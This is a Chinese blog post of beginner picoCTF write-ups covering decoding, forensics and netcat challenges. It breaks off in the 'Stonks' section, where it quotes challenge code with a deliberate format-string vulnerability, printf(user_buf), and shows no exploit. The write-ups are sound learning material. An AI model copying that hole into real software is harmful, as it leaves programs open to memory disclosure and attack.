@@ -1,0 +1,389 @@
+<!doctype html><html lang=zh-tw dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="一些入門 CTF 題目的 Write🆙🥺"><title>🤖picoCTF Write🆙</title><link rel=canonical href=https://ncchen99.github.io/p/picoctf-writeup/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="🤖picoCTF Write🆙"><meta property='og:description' content="一些入門 CTF 題目的 Write🆙🥺"><meta property='og:url' content='https://ncchen99.github.io/p/picoctf-writeup/'><meta property='og:site_name' content><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2021-06-18T18:34:35+00:00'><meta property='article:modified_time' content='2021-06-18T18:34:35+00:00'><meta property='og:image' content='https://cdn.jsdelivr.net/gh/ncchen99/web-app-assets@2.3/blog/wallpaper/img8.jpg'><meta name=twitter:title content="🤖picoCTF Write🆙"><meta name=twitter:description content="一些入門 CTF 題目的 Write🆙🥺"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://cdn.jsdelivr.net/gh/ncchen99/web-app-assets@2.3/blog/wallpaper/img8.jpg'><link rel="shortcut icon" href=/favicon.jpg></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_5dbb0965c44a744b.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍀</span></figure><div class=site-meta><h1 class=site-name><a href=/></a></h1><h2 class=site-description>哈囉👋 我叫念誠</h2></div></header><ol class=menu-social><li><a href=https://www.facebook.com/ncchen99/ target=_blank title=Facebook rel=me><svg class="icon icon-tabler icon-tabler-brand-facebook" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 10v4h3v7h4v-7h3l1-4h-4V8a1 1 0 011-1h3V3h-3a5 5 0 00-5 5v2H7"/></svg></a></li><li><a href=https://github.com/ncchen99/Hugo_Blog target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://www.instagram.com/ncchen.foss target=_blank title=Instagram rel=me><svg class="icon icon-tabler icon-tabler-brand-instagram" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4m0 4a4 4 0 014-4h8a4 4 0 014 4v8a4 4 0 01-4 4H8a4 4 0 01-4-4z"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M16.5 7.5v.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>首頁</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>歸檔</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>搜尋</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>連結</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#obedient-cat>😺Obedient Cat</a><ol><li><a href=#description>💁Description</a></li><li><a href=#solution>🙆Solution</a></li></ol></li><li><a href=#mod-26>🙊Mod 26</a><ol><li><a href=#description-1>💁Description</a></li><li><a href=#solution-1>🙆Solution</a></li></ol></li><li><a href=#python-wrangling>🐍Python Wrangling</a><ol><li><a href=#description-2>💁Description</a></li><li><a href=#solution-2>🙆Solution</a></li></ol></li><li><a href=#wave-a-flag>🏁Wave a flag</a><ol><li><a href=#description-3>💁Description</a></li><li><a href=#solution-3>🙆Solution</a></li></ol></li><li><a href=#information>👁‍information</a><ol><li><a href=#description-4>💁Description</a></li><li><a href=#solution-4>🙆Solution</a></li></ol></li><li><a href=#nice-netcat>😻Nice netcat&mldr;</a><ol><li><a href=#description-5>💁Description</a></li><li><a href=#solution-5>🙆Solution</a></li></ol></li><li><a href=#transformation>👩‍🏭Transformation</a><ol><li><a href=#description-6>💁Description</a></li><li><a href=#solution-6>🙆Solution</a></li></ol></li><li><a href=#stonks>📺Stonks</a><ol><li><a href=#description-7>💁Description</a></li><li><a href=#solution-7>🙆Solution</a></li></ol></li><li><a href=#get-ahead>🌺GET aHEAD</a><ol><li><a href=#description-8>💁Description</a></li><li><a href=#solution-8>🙆Solution</a><ol><li><a href=#curl>cURL</a></li><li><a href=#burpsuite>Burpsuite</a></li><li><a href=#python-requests>Python requests</a></li></ol></li></ol></li><li><a href=#cookies>🍻Cookies</a><ol><li><a href=#description-9>💁Description</a></li><li><a href=#solution-9>🙆Solution</a></li></ol></li><li><a href=#insp3ct0r>👹Insp3ct0r</a><ol><li><a href=#description-10>💁Description</a></li><li><a href=#solution-10>🙆Solution</a></li></ol></li><li><a href=#scavenger-hunt>😼Scavenger Hunt</a><ol><li><a href=#description-11>💁Description</a></li><li><a href=#solution-11>🙆Solution</a></li></ol></li><li><a href=#where-are-the-robots>🐾where are the robots</a><ol><li><a href=#description-12>💁Description</a></li><li><a href=#solution-12>🙆Solution</a></li></ol></li><li><a href=#logon>🦄logon</a><ol><li><a href=#description-13>💁Description</a></li><li><a href=#solution-13>🙆Solution</a></li></ol></li><li><a href=#dont-use-client-side>🐻dont-use-client-side</a><ol><li><a href=#description-14>💁Description</a></li><li><a href=#solution-14>🙆Solution</a></li></ol></li><li><a href=#it-is-my-birthday>🥝It is my Birthday</a><ol><li><a href=#description-15>💁Description</a></li><li><a href=#solution-15>🙆Solution</a></li></ol></li><li><a href=#who-are-you>🐣Who are you?</a><ol><li><a href=#description-16>💁Description</a></li><li><a href=#solution-16>🙆Solution</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/picoctf-writeup/><img src=https://cdn.jsdelivr.net/gh/ncchen99/web-app-assets@2.3/blog/wallpaper/img8.jpg loading=lazy alt="Featured image of post 🤖picoCTF Write🆙"></a></div><div class=article-details><header class=article-category><a href=/categories/writeup/>Writeup</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/picoctf-writeup/>🤖picoCTF Write🆙</a></h2><h3 class=article-subtitle>一些入門 CTF 題目的 Write🆙🥺</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Jun 18, 2021</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>8 minute read</time></div></footer></div></header><section class=article-content><p>最近想說來練習CTF的東西🥺 偶隔膜覺得CTF好難哇😰 只能先從pico的簡單題目開始惹💩 有大佬說寫writeup會很有幫助😈 先來試試看窩🥶</p><hr><h2 id=obedient-cat>😺Obedient Cat</h2><ul><li>Category: General Skills</li><li>Score: 5</li></ul><h3 id=description>💁Description</h3><p>This file has a flag in plain sight (aka &ldquo;in-the-clear&rdquo;). <a class=link href=https://mercury.picoctf.net/static/2d24d50b4ebed90c704575627f1f57b2/flag target=_blank rel=noopener>Download flag</a></p><h3 id=solution>🙆Solution</h3><p>下載下來然後打開🥺</p><hr><h2 id=mod-26>🙊Mod 26</h2><ul><li>Category: Cryptography</li><li>Score: 10</li></ul><h3 id=description-1>💁Description</h3><p>Cryptography can be easy, do you know what <strong>ROT13</strong> is? cvpbPGS{arkg_gvzr_V&rsquo;yy_gel_2_ebhaqf_bs_ebg13_nSkgmDJE}</p><h3 id=solution-1>🙆Solution</h3><p>去Google一下原來 ROT13 是 rotate by 13 places 的意思，是相差十三個字母的凱撒加密，拿去線上CTF小工具解一下，結果全部變小寫🤢，眼睛不好看不出來，只好查解答🙊，原來 ROT13 可以用一個叫做<code>nkf</code>的軟件變回來，用法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>echo &#34;cvpbPGS{arkg_gvzr_V&#39;yy_gel_2_ebhaqf_bs_ebg13_nSkgmDJE}&#34; | nkf -r
+</span></span></code></pre></td></tr></table></div></div><p><code>nkf</code> 是一個漢字的轉換器的樣子😮　不過它還可以用<a class=link href=https://linux.die.net/man/1/nkf target=_blank rel=noopener>參數</a><code>-r</code> 轉換 <code>ROT13</code> 。</p><hr><h2 id=python-wrangling>🐍Python Wrangling</h2><ul><li>Category: General Skills</li><li>Score: 10</li></ul><h3 id=description-2>💁Description</h3><p>Python scripts are invoked kind of like programs in the Terminal&mldr; Can you run <a class=link href=https:// target=_blank rel=noopener>this Python</a> script using <a class=link href=https:// target=_blank rel=noopener>this password</a> to get <a class=link href=https:// target=_blank rel=noopener>the flag</a>?</p><h3 id=solution-2>🙆Solution</h3><p>好像要執行臘個Python檔案的樣子🐌　偶把他們（三個檔案）全部載下來，生氣氣載是ㄗㄞˋ不是ㄗㄞˇ，打字都打不出來🤧，它的意思是要用這個小程式解密<code>flag.txt.en</code>的樣子，用一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 ende.py
+</span></span></code></pre></td></tr></table></div></div><p>它寫說：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Usage: ende.py (-e/-d) [file]
+</span></span></code></pre></td></tr></table></div></div><p>所以就用醬子：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 ende.py -d flag.txt.en
+</span></span></code></pre></td></tr></table></div></div><p>應該會有答案跑出來😲😲　它希望偶用pico的小黑黑terminal的樣子，不過偶都本末倒置🤕🤕</p><hr><h2 id=wave-a-flag>🏁Wave a flag</h2><ul><li>Category: General Skills</li><li>Score: 10</li></ul><h3 id=description-3>💁Description</h3><p>Can you invoke help flags for a tool or binary? <a class=link href=[https://]%28https://mercury.picoctf.net/static/b28b6021d6040b086c2226ebeb913bc2/warm%29>This program</a> has extraordinarily helpful information&mldr;</p><h3 id=solution-3>🙆Solution</h3><p>好像要執行臘個程式的樣子🐌　先把它載下來，可以練習用 <code>wget</code> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget https://mercury.picoctf.net/static/b28b6021d6040b086c2226ebeb913bc2/warm
+</span></span></code></pre></td></tr></table></div></div><p>如果直接執行的的話📫　它會說不行🥺　所以幫它加一個執行的權限😈</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>chmod +x warm
+</span></span></code></pre></td></tr></table></div></div><p>再來執行🥺</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./warm
+</span></span></code></pre></td></tr></table></div></div><p>它寫說：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Hello user! Pass me a -h to learn what I can do!
+</span></span></code></pre></td></tr></table></div></div><p>所以就用醬子：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>./warm -h
+</span></span></code></pre></td></tr></table></div></div><p>應該會有答案跑出來😲😲</p><hr><h2 id=information>👁‍information</h2><ul><li>Category: Forensics</li><li>Score: 10</li></ul><h3 id=description-4>💁Description</h3><p>Files can always be changed in a secret way. Can you find the flag? <a class=link href=https://mercury.picoctf.net/static/c28a959c5605d5f67480d5dd3a77f302/cat.jpg target=_blank rel=noopener>cat.jpg</a></p><h3 id=solution-4>🙆Solution</h3><p>先把😺圖片載下來，結果看不出神模東西🐌　開始查別人的writeup😕 原來可以用<a class=link href=https://29a.ch/photo-forensics/#strings target=_blank rel=noopener>這個網頁</a>看檔案裡面可以顯示的字，也可以用 <code>strings</code> 的指令na，只是因為太大惹🥺，所以偶的<code>terminal</code>會看不到上面的字，所以可以加一個<code>-10</code>只顯示那些一行大於 <strong>10</strong> 個字的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>strings -10 cat.jpg
+</span></span></code></pre></td></tr></table></div></div><p>發現裡面有這個東西</p><p>:::spoiler 很像xml的東C</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;x:xmpmeta xmlns:x=&#39;adobe:ns:meta/&#39; x:xmptk=&#39;Image::ExifTool 10.80&#39;&gt;
+</span></span><span class=line><span class=cl>&lt;rdf:RDF xmlns:rdf=&#39;http://www.w3.org/1999/02/22-rdf-syntax-ns#&#39;&gt;
+</span></span><span class=line><span class=cl> &lt;rdf:Description rdf:about=&#39;&#39;
+</span></span><span class=line><span class=cl>  xmlns:cc=&#39;http://creativecommons.org/ns#&#39;&gt;
+</span></span><span class=line><span class=cl>  &lt;cc:license rdf:resource=&#39;cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9&#39;/&gt;
+</span></span><span class=line><span class=cl> &lt;/rdf:Description&gt;
+</span></span><span class=line><span class=cl> &lt;rdf:Description rdf:about=&#39;&#39;
+</span></span><span class=line><span class=cl>  xmlns:dc=&#39;http://purl.org/dc/elements/1.1/&#39;&gt;
+</span></span><span class=line><span class=cl>  &lt;dc:rights&gt;
+</span></span><span class=line><span class=cl>   &lt;rdf:Alt&gt;
+</span></span><span class=line><span class=cl>    &lt;rdf:li xml:lang=&#39;x-default&#39;&gt;PicoCTF&lt;/rdf:li&gt;
+</span></span><span class=line><span class=cl>   &lt;/rdf:Alt&gt;
+</span></span><span class=line><span class=cl>  &lt;/dc:rights&gt;
+</span></span><span class=line><span class=cl> &lt;/rdf:Description&gt;
+</span></span><span class=line><span class=cl>&lt;/rdf:RDF&gt;
+</span></span><span class=line><span class=cl>&lt;/x:xmpmeta&gt;
+</span></span></code></pre></td></tr></table></div></div><p>:::<br></p><p>然後裡面的這個是一個base64編碼的文字👿</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;cc:license</span> <span class=na>rdf:resource=</span><span class=s>&#39;cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9&#39;</span><span class=nt>/&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以到<a class=link href=https://www.base64decode.org/ target=_blank rel=noopener>線上</a>轉一下或是練習指令：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9&#34;</span> <span class=p>|</span> base64 -d
+</span></span></code></pre></td></tr></table></div></div><p>應該會有答案跑出來😲😲 葛是醬擠偶真的想不到耶🥺🥺</p><hr><h2 id=nice-netcat>😻Nice netcat&mldr;</h2><ul><li>Category: General Skills</li><li>Score: 15</li></ul><h3 id=description-5>💁Description</h3><p>There is a nice program that you can talk to by using this command in a shell:
+<code>$ nc mercury.picoctf.net 22342</code>, but it doesn&rsquo;t speak English&mldr;</p><h3 id=solution-5>🙆Solution</h3><p>這個題目要偶們用<code>nc</code>這個小工具連到 <code>mercury.picoctf.net 22342</code>的樣子，去查惹一下，<code>nc</code>是用<code>TCP</code>或<code>UDP</code>協定對端點進行讀寫的小工具，用法就像題目寫的那樣子。</p><p>連上去之後它吐惹很多數字出來，猜不出來是葛摩🙄 只好看一下提示，原來是<code>ASCII</code>的十進位數字🙂 寫一個小Python來轉換😎</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from __future__ import print_function
+</span></span><span class=line><span class=cl>import socket
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>HOST = &#34;mercury.picoctf.net&#34;
+</span></span><span class=line><span class=cl>PORT = 22342
+</span></span><span class=line><span class=cl>BUFFER = 4096
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span class=line><span class=cl>sock.connect((HOST, PORT))
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>while 1:
+</span></span><span class=line><span class=cl>    recv = sock.recv(BUFFER).split()
+</span></span><span class=line><span class=cl>    if recv:
+</span></span><span class=line><span class=cl>        for num in recv:
+</span></span><span class=line><span class=cl>            num.strip()
+</span></span><span class=line><span class=cl>            print(chr(int(num)),end=&#34;&#34;)
+</span></span><span class=line><span class=cl>    else:
+</span></span><span class=line><span class=cl>        continue
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sock.close()
+</span></span></code></pre></td></tr></table></div></div><p>應該會有答案跑出來😲😲</p><hr><h2 id=transformation>👩‍🏭Transformation</h2><ul><li>Category: Reverse Engineering</li><li>Score: 20</li></ul><h3 id=description-6>💁Description</h3><p>I wonder what this really is&mldr; <a class=link href=https://mercury.picoctf.net/static/e47483f88b12f2ab0c46315afc12f64d/enc target=_blank rel=noopener>enc</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>chr</span><span class=p>((</span><span class=nb>ord</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]))</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>flag</span><span class=p>),</span> <span class=mi>2</span><span class=p>)])</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=solution-6>🙆Solution</h3><p>本來以為 <code>enc</code> 的檔案是要拿來執行的🥵　結果只是一個文字檔，看惹提示還是不懂🔧，只好去查別人的write🆙，原來題目的意思是檔案裡的字串是<code>flag</code> 經由下面ㄉPython程式轉換出來的，所以偶們要按照程式的規則推回去😰　</p><p>結果偶發現別人解答的程式跑惹會報錯，題目的轉換程式也是🥺，看起來問題是這些<code>unicode</code> 編碼的東西用 <code>Python</code> 的 <code>ord()</code> 轉出來剩下8bit但是實際上應該是16bit才對，提示又說需要找一些線上編碼的工具，所以偶先拿去<a class=link href=https://www.online-toolz.com/tools/text-unicode-entities-convertor.php target=_blank rel=noopener>這個網頁</a>轉成樣子怪怪的十六進位數字編號，然後寫一個步驟相反的小Python🐍</p><p>題目的Python會把 <code>flag</code> 兩個兩個字一組，第一個字左移8位（位元運算）然後轉成ASCII的數字編號　加上　轉成ASCII數字編號的第二個字，再把這個東西由數字編號轉成一個字元（不過偶的<code>chr()</code>是不能接收大於<code>256[8bit]</code>的參數na🥺🥺）。</p><blockquote><p>以　flag　的前兩個字舉例🤬</p></blockquote><div class=table-wrapper><table><thead><tr><th>原本的字</th><th>ASCII的編號</th><th>第一個字左移8bit</th><th>二進位</th></tr></thead><tbody><tr><td>p</td><td>112</td><td>28672</td><td>111000000000000</td></tr><tr><td>i</td><td>105</td><td>105</td><td>000000001101001</td></tr><tr><td>編號(28672 + 105)的 Unicode 應該會是<strong>灩</strong></td><td></td><td></td><td></td></tr></tbody></table></div><p>所以逆著做就需要先把一個字變成兩個，用右移推出第一個字，第二個字偶是用取模把後8個bit用粗乃na，可能不是很好🤒🤒　然後再把它們各自轉回字元🙊　醬子應該就有答案惹💋</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>enc = &#34;%u7069%u636F%u4354%u467B%u3136%u5F62%u6974%u735F%u696E%u7374%u3334%u645F%u6F66%u5F38%u5F65%u3134%u3161%u3066%u377D&#34;
+</span></span><span class=line><span class=cl>enc = enc.split(&#34;%u&#34;)
+</span></span><span class=line><span class=cl>for i in range(1, len(enc)):
+</span></span><span class=line><span class=cl>    num = int(enc[i].lower(), 16)
+</span></span><span class=line><span class=cl>    print(chr(num &gt;&gt; 8)+chr(num % (1 &lt;&lt; 8)), end=&#34;&#34;)
+</span></span></code></pre></td></tr></table></div></div><hr><h2 id=stonks>📺Stonks</h2><ul><li>Category: Binary Exploitation</li><li>Score: 20</li></ul><h3 id=description-7>💁Description</h3><p>I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn&rsquo;t believe you if you told me it&rsquo;s unsecure! <a class=link href=https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c target=_blank rel=noopener>vuln.c</a> <code>nc mercury.picoctf.net 33411</code></p><h3 id=solution-7>🙆Solution</h3><p>唉這個好難哇🥺🥺　這個題目叫偶們連到 <code>mercury.picoctf.net 33411</code> 它還有附這個程式　<code>vuln.c</code> ，要從裡面找到有問題的地方🤕　偶太呆只好去找別人的Write🆙，偶有看惹 <a class=link href=https://github.com/Kasimir123/CTFWriteUps/tree/main/2021-03-picoCTF/stonks target=_blank rel=noopener>Kasimir123</a>　大大和 <a class=link href=https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Stonks.md target=_blank rel=noopener>Dvd848</a> 大佬的，偶的程式是用他們的改的🤢　</p><p><code>vuln.c</code> 的問題在這裡：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>char *user_buf = malloc(300 + 1);
+</span></span><span class=line><span class=cl>printf(&#34;What is your API token?\n&#34;);
+</span></span><span class=line><span class=cl>scanf(&#34;%300s&#34;, user_buf);
+</span></span><span class=line><span class=cl>printf(&#34;Buying stonks with token:\n&#34;);
+</span></span><span class=line><span class=cl>printf(user_buf);
